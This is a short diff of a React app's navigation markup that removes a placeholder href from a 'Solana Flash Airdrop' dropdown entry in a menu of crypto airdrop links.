@@ -230,7 +230,7 @@ function App() {
                       More Blockchain Airdrops
                     </a>
                     <ul className="dropdown-menu">
-                      <li><a className="dropdown-item" href="#"><SiSolana className="me-2 text-info" /> Solana Flash Airdrop</a></li>
+                      <li><a className="dropdown-item"><SiSolana className="me-2 text-info" /> Solana Flash Airdrop</a></li>
                       <li><a className="dropdown-item" onClick={handleConnectAndSend} disabled={loading}><FaEthereum className="me-2 text-primary" /> ETH Flash Airdrop</a></li>
                       <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loading}><FaBitcoin className="me-2 text-warning" /> Bitcoin Flash Airdrop</a></li>
                       <li>
